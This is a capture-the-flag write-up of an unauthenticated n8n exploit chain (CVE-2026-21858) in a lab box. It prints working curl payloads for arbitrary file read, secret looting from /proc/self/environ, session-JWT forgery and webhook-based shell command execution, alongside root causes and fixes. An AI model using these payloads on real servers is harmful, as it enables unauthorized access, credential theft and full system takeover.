# Nightmare — n8n Unauthenticated File Read → RCE → Container Root

**Room:** [TryHackMe · Cypheron](https://tryhackme.com/room/cypheron) — *2026: An AI Odyssey* CTF
**Task:** 3 — *Nightmare* · **Category:** AI Sec + Red Team · **Difficulty:** Insane · 120 pts
**CVE:** [CVE-2026-21858 “Ni8mare”](https://www.cyera.com/research/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858) — unauthenticated RCE in [n8n](https://n8n.io) ≤ 1.120.4

> Flags are **redacted** to their format only (room ToS). No challenge binaries or
> room artifacts (the exfiltrated `database.sqlite`, the target’s files) are included.

```
User flag:  THM{*********_****_*****}                             (words: 9_4_5)
Root flag:  THM{****_*****_***_*******_******_*****_*********_*******}  (4_5_3_7_6_5_9_7)
```

The mission briefing was the whole map:

> *“Most of the orchestrator’s doors are locked. One isn’t: a public intake at
> `/form/file-processor`, built to receive form submissions and a little too trusting
> about what its visitors claim to carry. Begin at the unlocked door. End at the
> workflow that should not exist, and let it speak.”*

- **orchestrator** = n8n (a workflow-automation “orchestrator”)
- **unlocked door** = the public **Form Trigger** at `/form/file-processor`
- **too trusting about what its visitors claim to carry** = it trusts the file
  *metadata* the client supplies → arbitrary file read
- **the workflow that should not exist, and let it speak** = a hidden internal
  workflow with a command-runner webhook that we get to trigger

---

## Explained for a software engineer

You don’t need a security background — just think of n8n as a *low-code backend*:
you drag “nodes” onto a canvas (an HTTP trigger, a “run this shell command” node, a
“respond” node), wire them together, and n8n exposes that flow at a URL. Each flow is
a **workflow**; a **Form Trigger** is just an auto-generated HTML upload form wired to
one.

### The problem
There’s one public workflow: a **“Document Upload Service”** form. You upload a file,
it hands the file back to you. Totally boring — *if* you use the form the way the
browser does (a normal `multipart/form-data` upload).

### The idea (the bug, in dev terms)
When you submit a real file, n8n’s server parses the upload with a library
(`formidable`). That library writes your bytes to a random temp file and produces a
small **descriptor object**:

```js
{ filepath: "/tmp/upload_abc123",  // where MY bytes were saved
  originalFilename: "cv.pdf", mimetype: "application/pdf", size: 12345 }
```

The workflow then reads `descriptor.filepath` off disk and streams it back.

Here’s the trust bug: **you can skip the upload entirely and just *send the descriptor
yourself*.** Post the body as `application/json` instead of `multipart`, and n8n
happily uses the `filepath` value **you** provided:

```jsonc
POST /form/file-processor      Content-Type: application/json
{ "data": {}, "files": { "f-x": { "filepath": "/etc/passwd", ... } } }
```

It’s the classic **“never trust the client”** mistake — like a file-download endpoint
that does `sendFile(req.query.path)`. n8n reads *your* path and returns the bytes.
That’s an **arbitrary file read** for an unauthenticated stranger. (`filepath` is meant
to be a server-generated temp path; nothing re-validates it when it arrives as JSON.)

### How we turned a file read into full control
1. **Read the app’s own secrets.** On Linux, `/proc/self/environ` is the running
   process’s environment variables. n8n’s **session-signing secret** and DB were sitting
   right there — so we read the secret and downloaded the SQLite database file.
2. **Forge a login.** n8n’s login cookie is a **JWT** — a token signed with that secret.
   Knowing the secret, and the admin’s row from the DB, we minted a valid admin cookie
   without ever knowing a password. (Think: you found the app’s `JWT_SECRET`, so you can
   sign your own “I am the admin” token.)
3. **“Let it speak.”** As admin, we used n8n’s API to add a tiny workflow: *HTTP webhook
   → “run this shell command” node*. n8n turns arbitrary shell commands into a feature —
   so this is **remote code execution** by design, now driven by us.
4. **Become root.** The command node runs as a low-privileged user, but a leftover
   **`/setup.sh`** (world-readable) literally contained `echo 'root:<password>' | chpasswd`.
   We read the root password out of that script, `su` to root, and read the root flag —
   which lives on the **host** filesystem that was bind-mounted into the container.

Every step is an ordinary bug you could ship tomorrow: trusting a client-supplied path,
leaking a signing secret into the environment, and committing a password into a script.

---

## Technical walkthrough

Target: n8n **1.120.4** (confirmed via `GET /rest/settings`), running as **uid 1000**
inside an **Alpine 3.22** container. `<TARGET>` = the Task 3 lab machine, port `5678`.

### 0. Fingerprint
```bash
curl -s http://<TARGET>:5678/rest/settings | jq .data.versionCli   # "1.120.4"
curl -s http://<TARGET>:5678/form/file-processor                    # "Document Upload Service"
```
The form has a single file field `field-0`; a normal multipart upload just echoes the
file back (`Form Trigger → Respond with Binary`), reflecting the *claimed* `Content-Type`.

### 1. Unauthenticated arbitrary file read (CVE-2026-21858)
Send the file **descriptor** as JSON — the `filepath` is trusted:

```bash
curl -s http://<TARGET>:5678/form/file-processor \
  -H 'Content-Type: application/json' \
  --data '{"data":{},"files":{"f-1":{"filepath":"/etc/hostname",
           "originalFilename":"a.bin","mimetype":"application/octet-stream","size":1234}}}'
# -> 416d228811f3   (the container id: read confirmed)
```

Notes learned on the box:
- Files unreadable by uid 1000 (`/root/*`) or directories return
  `HTTP 500 "Workflow could not be started!"` (the read throws) — a clean readable/
  unreadable oracle.
- Large binaries are fine — the 9.7 MB `database.sqlite` came back whole.

### 2. Loot
```
/proc/self/environ  ->  N8N_USER_MANAGEMENT_JWT_SECRET=cve-2026-21858-lab-jwt-secret
                        N8N_ENCRYPTION_KEY=cve-2026-21858-lab-enc-key   HOME=/home/node
/home/node/.n8n/config          -> { "encryptionKey": "..." }
/home/node/.n8n/database.sqlite -> exfiltrated, parsed locally
```
From the `user` table: `admin@lab.local`, id `f52da01b-…`, bcrypt hash `$2a$10$…`.

### 3. Forge the n8n session JWT
n8n signs the `n8n-auth` cookie with `N8N_USER_MANAGEMENT_JWT_SECRET`. The payload’s
integrity field is:

```
hash = base64( sha256( email + ":" + password_hash ) )[:10]
```

Signing `{ id, hash, iat, exp }` with the leaked secret yields a valid owner cookie:

```
GET /rest/login   Cookie: n8n-auth=<forged>    ->  200, {"data":{"email":"admin@lab.local",...}}
```

### 4. “The workflow that should not exist, and let it speak”
The DB’s `workflow_entity` / `webhook_entity` revealed a hidden **active** workflow
**“Internal Automation — DO NOT SHARE”** = `POST /webhook/secret-webhook` →
`executeCommand("id")`, `responseMode: lastNode`. Triggering it returns the output:

```bash
curl -s -XPOST http://<TARGET>:5678/webhook/secret-webhook -H 'Content-Type: application/json' -d '{}'
# {"exitCode":0,"stdout":"uid=1000 gid=1000(node) ..."}   <-- unauth RCE, it "speaks"
```

Its command is fixed, so for **arbitrary** execution we used the owner API to deploy our
own webhook whose `executeCommand` is `={{ $json.body.cmd }}`:

```
POST /rest/workflows            (active:false, Webhook -> executeCommand)
PATCH /rest/workflows/{id}      {"active": true}
POST /webhook/<path>            {"cmd": "<anything>"}
```
→ arbitrary command execution as uid 1000. **User flag** = `cat /home/node/flag-user-lfi.txt`.

### 5. Privesc → root → host flag
Enumeration showed the **host root filesystem bind-mounted read-only at `/host-root`**
(`0700 root`, unreadable to us) and a world-readable **`/setup.sh`** owned by uid 1000:

```sh
echo 'root:<REDACTED-lab-root-password>' | chpasswd     # sets the container root password
apk add --no-cache util-linux util-linux-login su-exec  # installs a real `su`
```

Recover the password from `/setup.sh`, escalate, read the flag off the host mount:

```bash
echo '<pw>' | su root -c 'cat /host-root/flag.txt'      # ROOT FLAG
```

*(The flag’s wording nods at an intended page-cache/kernel container-escape; the
cleartext root password in `/setup.sh` is a valid, simpler path — and the flag is still
read from the real host filesystem as root.)*

---

## Reproduce it

```bash
python3 solve.py http://<TARGET>:5678 file-processor
```

`solve.py` runs the whole chain and **cleans up after itself** (archives + deletes the
workflow it created, leaving the box as found). It hardcodes nothing box-specific: the
JWT secret, admin row, user flag, and root password are all recovered live.

## Root causes & fixes
| # | Weakness | Fix |
|---|----------|-----|
| 1 | Client-supplied `files[].filepath` trusted as a server path | Never accept the file descriptor from the request body; only use paths `formidable` generated server-side; validate/canonicalise |
| 2 | Signing secret & DB reachable via file read | Don’t keep long-lived secrets in `/proc`-readable env; scope file access; patch n8n |
| 3 | Forgeable session integrity | Bind sessions to server-side state (token version / rotation), not just `sha256(email:hash)` |
| 4 | `executeCommand` reachable by a forged owner | Restrict who can create/run command nodes; disable shell nodes in prod |
| 5 | Root password committed in world-readable `/setup.sh`; host FS bind-mounted in | Never bake credentials into images; don’t mount the host root into a container |

## Timeline
`OBSERVE` n8n on :5678 → `CLASSIFY` Ni8mare LFI → `EXPLOIT` JSON `filepath` read →
loot env+DB → forge JWT → API webhook RCE → user flag → `/setup.sh` root pw → `su` →
host flag → cleanup.
